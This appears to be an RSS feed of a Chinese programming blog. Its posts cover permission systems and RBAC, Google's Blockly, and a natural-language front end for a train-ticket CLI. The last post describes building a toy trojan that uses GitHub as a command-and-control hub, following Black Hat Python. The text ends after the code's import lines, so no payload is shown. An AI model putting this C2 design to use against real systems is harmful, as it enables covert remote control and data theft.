<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>writing for time</title><link>/</link><description></description><atom:link href="/feeds/bian-cheng.rss.xml" rel="self"></atom:link><lastBuildDate>Tue, 06 Sep 2016 00:00:00 +0000</lastBuildDate><item><title>理解权限系统</title><link>/understand-permission.html</link><description>&lt;blockquote&gt;
&lt;p&gt;现实世界只不过是反射出了更高层次的世界的阴影   --- 柏拉图 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;计算机世界中的许多事物是现实世界的一个投影，现实中所见的许多模式/概念在计算机世界里都能找到&lt;/p&gt;
&lt;p&gt;&lt;code&gt;权限&lt;/code&gt;作为现实世界随处可见的概念，在我们谈论&lt;code&gt;私有制&lt;/code&gt;、&lt;code&gt;所有权&lt;/code&gt;时，时常会谈及权限，在计算机世界中，权限在许多系统中举足轻重&lt;/p&gt;
&lt;p&gt;曾记否，qq里隐身对她可见，怕她看不见，下线又上线，却依旧被视而不见&lt;br /&gt;
曾记否，好好的一个熟人，说做微商就做微商，痛心疾首，火速拉黑&lt;/p&gt;
&lt;p&gt;上述的这些，都是利用权限系统的典型案例，在qq隐身案例中，你对女神隐身可见，实际上是赋予了她可以看到你的隐身状态（真实状态）的权限；当然你也赋予了人家伤害你的权限&lt;/p&gt;
&lt;p&gt;在朋友圈中的案例中，你把微商拉分组到了&lt;code&gt;黑名单&lt;/code&gt;用户组，这样一来，他们就没有看到你的状态的权限，你也看不到他的刷屏&lt;/p&gt;
&lt;p&gt;下边我们将以几个案例来帮助理解权限系统的概念和设计，这些案例包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;linux操作系统中的权限系统&lt;/li&gt;
&lt;li&gt;微信朋友圈中的权限&lt;/li&gt;
&lt;li&gt;django中的权限系统&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;近期工作中遇到一个系统设计中关于权限的复杂问题（层级组织），本文是我自己学习权限系统以及对此思考的一个小结&lt;/p&gt;
&lt;h1&gt;linux中的权限系统&lt;/h1&gt;
&lt;p&gt;关于权限系统，我们以linux为切入点，它为大多技术人员所熟悉。我们重点关注其中的概念，而对实现细节不做深究&lt;/p&gt;
&lt;p&gt;linux是个多用户操作系统，这每个用户有自己的工作空间(home目录)。就好比多人住在一套公寓里，各自有自己的房间。&lt;/p&gt;
&lt;p&gt;在linux中&lt;code&gt;一切皆文件&lt;/code&gt;，linux鼓励使用文本文件，人和机器能理解文本文件，成为人和机器进行交流的最好途径。在linux中权限问题往往最终会落到文件的权限上。&lt;/p&gt;
&lt;p&gt;如果我们把文件视为一种资源。那么我们会发现 权限往往围绕这些概念：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户&lt;/li&gt;
&lt;li&gt;用户组（群组）&lt;/li&gt;
&lt;li&gt;资源&lt;/li&gt;
&lt;li&gt;权限类型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你对上述概念不大熟悉，推荐阅读鸟哥的&lt;a href="http://cn.linux.vbird.org/linux_basic/0210filepermission.php#UserandGroup"&gt;Linux 的文件权限与目录配置&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上班几个概念中，鸟哥对用户组的解释很棒（意义和功能），推荐一读&lt;/p&gt;
&lt;p&gt;总结来说，Linux一般将文件可存取的身份分为三个类别，分别是 owner/group/others，且三种身份各有 read/write/execute 权限&lt;/p&gt;
&lt;p&gt;我们举个本地文件的例子&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ls -l /tmp/test.txt
&lt;span class="c1"&gt;# -rw-r--r--  1 wwj  wheel  235103  9  7 10:26 /tmp/test.txt&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们在此引用鸟哥文章里的这张图&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://cn.linux.vbird.org/linux_basic/0210filepermission_files/0210filepermission_3.gif" /&gt;&lt;/p&gt;
&lt;p&gt;上述信息表示：文件&lt;code&gt;/tmp/test.txt&lt;/code&gt;是文件(&lt;code&gt;-&lt;/code&gt;)，文件拥有者(wwj)的权限为&lt;code&gt;rw-&lt;/code&gt;(读写)，文件拥有群组(wheel)的权限为&lt;code&gt;r--&lt;/code&gt;(读)，其他人的权限为&lt;code&gt;r--&lt;/code&gt;(读)&lt;/p&gt;
&lt;p&gt;如果你想改变文件属性与权限，可以使用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;chgrp ：改变文件所属群组&lt;/li&gt;
&lt;li&gt;chown ：改变文件拥有者&lt;/li&gt;
&lt;li&gt;chmod ：改变文件的权限&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有了群组/资源/用户这些概念，之后我们就可以这样表达权限了: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A用户有资源B的可读权限(r)&lt;/li&gt;
&lt;li&gt;群组X有资源Y的可读权限(r)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;朋友圈中的分组与权限&lt;/h1&gt;
&lt;p&gt;在用户/群组/资源/权限类型的时间下，我们也很好理解微信朋友圈的分组功能了&lt;/p&gt;
&lt;p&gt;你半夜回家发了一条: &lt;code&gt;今天大学聚会很开心&lt;/code&gt;，为了让没空到现场的同学也看到聚会情况，附上了聚会照片，却不想被诟病为&lt;code&gt;天天晒吃的&lt;/code&gt;，于是决定这条消息只对&lt;code&gt;大学同学组&lt;/code&gt;可见,这样只有在&lt;code&gt;大学同学组(群组)里的同学(用户)才能看到(可读权限)聚会消息(资源)&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;RBAC&lt;/h1&gt;
&lt;p&gt;如果我进一步抽象，我们便总结出了基于角色的访问控制(Role-Based Access Control，RBAC)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Who对What进行How操作&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我可以看到这种模式：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;大学同学组里的同学(who)才能看到(how)聚会消息(what)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;RBAC认为权限授权实际上是Who、What、How的问题&lt;/p&gt;
&lt;p&gt;在RBAC模型中，who、what、how构成了访问权限三元组,也就是&lt;code&gt;Who对What进行How的操作&lt;/code&gt;，各个要素的含义如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Who：权限的拥用者或主体（如User、Group、Role）&lt;/li&gt;
&lt;li&gt;What：权限针对的对象或资源（Resource）。&lt;/li&gt;
&lt;li&gt;How：具体的权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;特点&lt;/h3&gt;
&lt;p&gt;模型中概念与实际系统紧密对应。RBAC模型中的角色、用户和许可权等概念都是实际系统实际存在的实体，便于设计者建立现存的或待建系统的RBAC模型&lt;/p&gt;
&lt;h3&gt;分治的思路&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;我们要分割这些问题来讨论（分析的思路/分治）&lt;ul&gt;
&lt;li&gt;用户与角色的指派&lt;/li&gt;
&lt;li&gt;角色与权限的指派&lt;/li&gt;
&lt;li&gt;为定义角色的继承 进行的角色与角色的指派。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上述这些活动都要求把用户和权限联系起来。多数情况下它们最好由不同的管理员或管理角色来做。对角色指派权限是典型的应用管理者的职责（类似元角色）&lt;/p&gt;
&lt;h3&gt;概念解释&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Group：用户组，权限分配的单位与载体。组可以包括组(以实现&lt;code&gt;权限的继承&lt;/code&gt;)（适合用来处理层级问题），也可以包含用户，组内用户继承组的权限。User与Group是多对多的关系。Group可以层次化，以满足不同层级权限控制的要求。 （漂亮解决了我的问题）&lt;ul&gt;
&lt;li&gt;部门Department或组织Organization，都可以对应到Group&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Role：Role和User关系的左右两边都是Many-to-Many关系，角色是为了完成各种工作而创造，用户则依据它的责任和资格来被指派相应的角色，角色配置成其完成任务所需要的最小的权限集&lt;/li&gt;
&lt;li&gt;许可表（PERMISSIONS）包括许可标识、许可名称、受控对象、操作标识。许可表给出了受控对象与操作算子的对应关系。*  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;其他笔记&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;RBAC都是基于关系模型&lt;/li&gt;
&lt;li&gt;资源是受控对象&lt;/li&gt;
&lt;li&gt;RBAC模型支持数据抽象原则和继承概念&lt;/li&gt;
&lt;li&gt;RBAC模型没有提供操作顺序控制机制&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Django中的权限机制&lt;/h1&gt;
&lt;p&gt;这部分主要参考&lt;a href="http://www.jianshu.com/p/01126437e8a4"&gt;Django权限机制的实现&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果你对Django熟悉（不熟悉的话参考你所用web框架的权限机制），可以把这部分理解为以Django为例，解释如何把权限概念用于web项目&lt;/p&gt;
&lt;p&gt;在web应用中，权限机制能够约束用户行为，控制页面的显示内容（想想你的朋友圈和各种论坛的会员机制），也能使API更加安全和灵活（django-rest-framework中）&lt;/p&gt;
&lt;p&gt;Django中用&lt;code&gt;user&lt;/code&gt;, &lt;code&gt;group&lt;/code&gt;和&lt;code&gt;permission&lt;/code&gt;完成了权限机制(和linux很像)，这些概念，我们在前文中阐述清楚了，这个权限机制是将属于model的某个permission赋予user或group，可以理解为全局的权限（ps：如果你需要更细分的权限机制，可以试试：&lt;a href="https://github.com/lukaszb/django-guardian"&gt;django-guardian&lt;/a&gt;）&lt;/p&gt;
&lt;h3&gt;Django的权限项&lt;/h3&gt;
&lt;p&gt;Django用permission（如前文说的许可表）对象存储权限项（How），每个model默认都有三个permission，即add model, change model和delete model，在admin中你可以看到，当然我们也可以手动添加其他权限项，不过值得注意的是权限是针对model的，而不是instance的！&lt;/p&gt;
&lt;p&gt;为一个用户添加权限，既可以在view里做（编码），也可以由管理员（Role）在admin里做（不需要编码）&lt;/p&gt;
&lt;h3&gt;在模板中使用&lt;/h3&gt;
&lt;p&gt;当前登录用户的权限存储在模板变量 &lt;code&gt;{{ perms }}&lt;/code&gt; 中&lt;/p&gt;
&lt;h1&gt;todo&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;LDAP  认证和权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;h3&gt;相关概念&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://baike.baidu.com/item/RBAC"&gt;RBAC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/What-are-some-good-ways-to-design-permission-systems-in-software"&gt;What are some good ways to design permission systems in software&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Role-based_access_control"&gt;Role-based access control&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/xuhaipeng/article/details/4430446"&gt;角色权限系统的 一些概念&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/painsonline/article/details/7183613/"&gt;RBAC权限管理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cncoders.net/article/10564/"&gt;权限系统---简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/20313385"&gt;如何设计网站权限系统&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ibm.com/support/knowledgecenter/zh/ssw_aix_61/com.ibm.aix.security/rbac_use_auths.htm"&gt;RBAC 权限&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/333620/best-practice-for-designing-user-roles-and-permission-system/25643919#25643919"&gt;Best Practice for Designing User Roles and Permission System&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh/%E7%A7%81%E6%9C%89%E5%88%B6"&gt;私有制&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E6%89%80%E6%9C%89%E6%9D%83"&gt;所有权&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;django&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/01126437e8a4"&gt;Django权限机制的实现&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.usyiyi.cn/django/topics/auth/default.html"&gt;使用Django认证系统&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikibooks.org/zh/Django/%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81"&gt;维基教科书 Django/用户认证&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://cn.linux.vbird.org/linux_basic/0210filepermission.php"&gt;Linux 的文件权限与目录配置&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://justcode.ikeepstudying.com/2016/08/linux-%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E6%80%BB%E7%BB%93/"&gt;Linux: 系统文件权限总结&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/frand/archive/2011/01/03/1924987.html"&gt;掌握Linux的用户(组)，权限，文件精妙的三角关系&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 06 Sep 2016 00:00:00 +0000</pubDate><guid>tag:,2016-09-06:understand-permission.html</guid><category>code</category></item><item><title>blockly入门与介绍</title><link>/blockly-overview.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/blockly9c7fc7e6.png" /&gt;&lt;/p&gt;
&lt;h1&gt;介绍&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/google/blockly"&gt;blockly&lt;/a&gt;是google发布的可视化编程工具，基于web技术构建。&lt;/p&gt;
&lt;p&gt;在功能/设计上和MIT的儿童编程语言&lt;a href="https://scratch.mit.edu/"&gt;Scratch&lt;/a&gt;类似&lt;/p&gt;
&lt;p&gt;使用blockly的时候，用户可以通过拖曳模块，来构建代码逻辑，过程很像搭积木&lt;/p&gt;
&lt;p&gt;在用户视角下，blockly是一个简单易用的可视化工具，用来生成代码。在开发者视角下，blockly是一个文本框，里边包含了用户输入好的代码。&lt;/p&gt;
&lt;p&gt;代码生成到文本框的过程，就是用户在blockly里拖曳的过程&lt;/p&gt;
&lt;p&gt;更多细节可以参考官方的&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;介绍&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;特性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;完全是JavaScript，可离线使用&lt;/li&gt;
&lt;li&gt;可生成6门语言：  &lt;ul&gt;
&lt;li&gt;JavaScript&lt;/li&gt;
&lt;li&gt;Python&lt;/li&gt;
&lt;li&gt;PHP&lt;/li&gt;
&lt;li&gt;Dart&lt;/li&gt;
&lt;li&gt;Lua&lt;/li&gt;
&lt;li&gt;XML(XML有时也被视为语言，实际上它更像语法树)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支持主流的浏览器，如：Chrome, Firefox, Safari, Opera, IE&lt;/li&gt;
&lt;li&gt;支持移动设备&lt;/li&gt;
&lt;li&gt;支持许多编程的基本元素，如：变量、函数、数组&lt;/li&gt;
&lt;li&gt;易于扩展自定义的块&lt;/li&gt;
&lt;li&gt;支持多国语言（40+）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;在线体验&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://blockly-demo.appspot.com/static/demos/index.html"&gt;demo&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;文档&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://developers.google.com/blockly/"&gt;文档&lt;/a&gt;：需要梯子&lt;/p&gt;
&lt;h1&gt;技术视角&lt;/h1&gt;
&lt;p&gt;在此我们以技术视角来审视blockly，而不怎么谈论它的教育意义&lt;/p&gt;
&lt;h3&gt;作为编辑器的blockly&lt;/h3&gt;
&lt;p&gt;blockly将自己定位为一个编辑器&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The web-based visual programming editor&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上边这句话是&lt;a href="https://github.com/google/blockly"&gt;blockly&lt;/a&gt;源码库的自描述&lt;/p&gt;
&lt;p&gt;这个定位十分符合unix哲学：&lt;code&gt;Do one thing&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;而且它确实是实诚的编辑器，而不是那种伪装成编辑器的操作系统（此处有火药味）&lt;/p&gt;
&lt;p&gt;blockly作为编辑器，它的输入为用户的拖曳（拖曳作为一种输入，可以类比为普通编辑器的键盘输入），输出为&lt;code&gt;生成的代码&lt;/code&gt;。使用blockly可以快速打造一个特定领域的可视化 块编程 编辑器&lt;/p&gt;
&lt;p&gt;至于每个积木（block）如何生成代码，代码用于什么用途，blockly则通通不关心，用户自己掌控。&lt;/p&gt;
&lt;p&gt;由于设计上遵循unix哲学，他也将获得unix哲学带来的好处，小而美带来的强大的组合能力。于是围绕blockly的生态十分广阔。涵盖硬件、软件，领域涵盖科研、教育、游戏、玩具等等&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/blocklyf7a63b9c.png" /&gt;&lt;/p&gt;
&lt;h3&gt;使用场景&lt;/h3&gt;
&lt;p&gt;随便列举几个典型的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;以拖曳的方式生成代码，控制硬件&lt;/li&gt;
&lt;li&gt;作为软件的输入（demo中的拖曳出函数并生成图像）&lt;/li&gt;
&lt;li&gt;作为软件的的实时控制界面&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;构建一个Blockly app的步骤&lt;/h3&gt;
&lt;p&gt;按照官方文档&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;overview&lt;/a&gt;的说法，有以下三步：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;集成blockly编辑器&lt;/li&gt;
&lt;li&gt;定义你的app里的功能块（block）&lt;/li&gt;
&lt;li&gt;构建app的其余部分，blockly仅充当代码生成器，你需要决定这些用户生成的代码用于做什么，这也是你的app的核心功能所在&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Blockly的强大之处&lt;/h3&gt;
&lt;p&gt;这部分翻译自&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;官方文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Blockly作为一个可视化编程环境，正逐渐流行，那么你如何利用它呢，下边的优势举例可能对你有启发：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可导出的代码: 可以将基于block程序转化为基于普通文本的常规代码（多语言）&lt;/li&gt;
&lt;li&gt;开源： 可以以任何方式定制/使用它，甚至入侵修改它的内核&lt;/li&gt;
&lt;li&gt;可拓展： 通过添加定制化的&lt;code&gt;block关联到你的api上&lt;/code&gt; （将提供服务的部分视为下位机，对外提供api/指令集）&lt;/li&gt;
&lt;li&gt;生产可用：blockly不是一个玩具，你可以用它完成复杂的编程任务，例如写一个可以计算标准差的block&lt;/li&gt;
&lt;li&gt;国际化：blockly支持40多门语言&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;衍生项目&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blockly-games.appspot.com/"&gt;Blockly Game&lt;/a&gt;：拖曳式小游戏&lt;/li&gt;
&lt;li&gt;&lt;a href="https://scratch.mit.edu/developers"&gt;Scratch Blocks&lt;/a&gt;：该项目由Scratch团队使用blockly构建&lt;/li&gt;
&lt;li&gt;&lt;a href="http://appinventor.mit.edu/explore/"&gt;App Inventor&lt;/a&gt;：基于blockly的可视化安卓IDE&lt;/li&gt;
&lt;li&gt;&lt;a href="code.org"&gt;Code.org&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ozoblockly.com/"&gt;OzoBlockly&lt;/a&gt;：一个可编程微型机器人，编码烧录很有意思（屏幕闪烁）&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.makewonder.com/"&gt;Wonder Workshop&lt;/a&gt;：可编程机器人玩具&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lab.open-roberta.org/"&gt;Open Roberta&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.scriptr.io/"&gt;scriptr.io&lt;/a&gt;：物联网云端IDE&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;脑洞&lt;/h1&gt;
&lt;p&gt;用做配置工具&lt;/p&gt;
&lt;p&gt;我们常遇到这种纠结：究竟要给用户怎样的配置界面，常规的UI界面，虽然友好，能做的事太少了。而基于文本的配置，表达能力是加强了，对用户不仅不友好，还容易因为拼写错误，出现奇怪问题（缺乏验证机制），让用户摸不着头脑&lt;/p&gt;
&lt;p&gt;基于blockly的配置工具，似乎是个很不错的选择，拥有编程语言级别的表达能力，操作起来又不晦涩。细节有空细说，下次有配置项丰富的项目，我决定试试blockly&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;Introduction to Blockly&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cooc-china.gitbooks.io/blockly/content/chapter1.html"&gt;Blockly是什么&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 02 Sep 2016 00:00:00 +0000</pubDate><guid>tag:,2016-09-02:blockly-overview.html</guid><category>code</category></item><item><title>为命令行火车票查询器添加自然语言交互界面</title><link>/iquery-nlp-interface.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/ibot13761852.png" /&gt;&lt;/p&gt;
&lt;p&gt;ps：采用&lt;a href="https://github.com/asciinema/asciinema"&gt;asciinema&lt;/a&gt;制作了&lt;a href="https://asciinema.org/a/69utp9gpwal1y85lyv01kbhe2"&gt;演示视频&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://asciinema.org/a/69utp9gpwal1y85lyv01kbhe2"&gt;&lt;img alt="asciicast" src="https://asciinema.org/a/69utp9gpwal1y85lyv01kbhe2.png" /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;项目地址&lt;/h1&gt;
&lt;p&gt;先上项目源码:&lt;a href="https://github.com/wwj718/ibot"&gt;ibot&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a href="https://github.com/protream/iquery"&gt;iquery&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;@sl前段时间跟我说，有个python写的命令行或者票查询器(iquery)很有趣，于是我玩了下，觉得挺好玩的，工具本身写得也干净利落。后来发现它只支持python3，还一度想让修改它使它兼容python2。&lt;/p&gt;
&lt;p&gt;此后有了新主意:为它加一个自然语言交互界面，这样被围观时，比较拉风&lt;/p&gt;
&lt;p&gt;当然啦，对于热爱CLI的小伙伴来说，CLI几乎是最佳的交互方式了，给它添加自然语言交互界面，未免画蛇添竹。我个人是偏好CLI的，不过觉得自然语言交互界面的好处之一是能然普通用户更自然地与机器对话，甚至采用语音与机器对话&lt;/p&gt;
&lt;h3&gt;iquery的安装和使用&lt;/h3&gt;
&lt;p&gt;iquery作为命令行工具，写的是很棒的&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# 安装&lt;/span&gt;
pip3 install iquery
iquery 上海虹桥 北京 802
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你将获得本年8月2号从上海虹桥到北京的火车票信息:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/iquerye2d84a70.png" /&gt;&lt;/p&gt;
&lt;p&gt;当然你也可以指定火车的类型和输入完整的查询日期, 比如:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;iquery -dg 上海 北京 20160802&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;ibot&lt;/h1&gt;
&lt;p&gt;下边我们来看看如何使用ibot来查询火车票,&lt;a href=""&gt;ibot&lt;/a&gt;已经发布为python包，直接pip安装就行&lt;/p&gt;
&lt;p&gt;使用:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ibot 2016年8月十一号 南京到北京的车票
ibot 明天从南京到北京的车票
ibot 这周六从南京去北京出差，帮我看下车票
ibot 下周五离开南京去北京 查下车票
ibot 查一下上海去北京的车票，下周六
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/ibot13761852.png" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 01 Aug 2016 00:00:00 +0000</pubDate><guid>tag:,2016-08-01:iquery-nlp-interface.html</guid><category>dev-tools</category></item><item><title>用python和github构建一只玩具木马</title><link>/use-python-and-github-create-Trojan-Horse.html</link><description>&lt;p&gt;周末在新街口大众书局看到 《Black Hat Python》(《python黑帽子 --黑客与渗透测试编程之道》),饶有兴致地翻了翻, 觉得第七章很有意思，分享过来&lt;/p&gt;
&lt;p&gt;作者在这一章里说道&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;One of the most challenging aspects of creating a solid trojan framework is asynchronously controlling, updating, and receiving data from your deployed implants. It’s crucial to have a relatively universal way to push code to your remote trojans&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;写一个特洛伊木马的的挑战之一是异步地控制、更新和接收数据，并且能够通用的方法给你的木马们远程推送指令，而作者试图在这一章中给出一个漂亮的解决方案&lt;/p&gt;
&lt;h1&gt;木马&lt;/h1&gt;
&lt;p&gt;上边说的的木马是什么鬼&lt;/p&gt;
&lt;p&gt;据维基百科说 , "木马"这一名称来源于希腊神话特洛伊战争的特洛伊木马。攻城的希腊联军佯装撤退后留下一只木马，特洛伊人将其当作战利品带回城内。当特洛伊人为胜利而庆祝时，从木马中出来了一队希腊兵，它们悄悄打开城门，放进了城外的军队，最终攻克了特洛伊城。计算机中所说的木马与病毒一样也是一种有害的程序，其特征与特洛伊木马一样具有伪装性，看起来挺好的，却会在用户不经意间，对用户的计算机系统产生破坏或窃取数据，特别是用户的各种账户及口令等重要且需要保密的信息，甚至控制用户的计算机系统。&lt;/p&gt;
&lt;p&gt;经过一番追本溯源，计算机中这种被称为木马的程序有哪些特性，大家大体上应该有个印象了，如果不用隐喻，要描述出这类程序的特质，恐怕要多费许多口舌&lt;/p&gt;
&lt;p&gt;计算机科学的趣味之一是它的词汇异常丰富和生动，有大量的隐喻和类比&lt;/p&gt;
&lt;p&gt;《代码大全》在开篇的不久说道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;计算机科学领域中有着搜友学科中最为丰富多彩的语言。你走进一间安全严密，温度精确控制在20℃的房间，并在里面发现了病毒（virus），特洛伊木马（Trojan horse），蠕虫（worm），臭虫（bug），逻辑炸弹（bomb），崩溃（crash），论坛口水战（flame），双绞线转换头（twisted sex changer），还有致命错误（fatal error）……在其他领域中，你能遇到这些吗？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;正餐&lt;/h1&gt;
&lt;p&gt;在着一章中，作者主要演示了如何利用github作为控制和数据中心，构建灵活的木马，至于你要用木马来做什么，你可以发挥想象自己写插件到module里&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;talk is cheap,show me your code&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;代码不长，直接贴上(大家可以直接看&lt;a href="https://github.com/wwj718/blackhatpythonbook"&gt;源码库&lt;/a&gt;)，值得说明的地方稍后讲解&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;json&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;imp&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;threading&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;Queue&lt;/span&gt;
&lt;span class="c1"&gt;#import os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;yaml&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;github3&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;

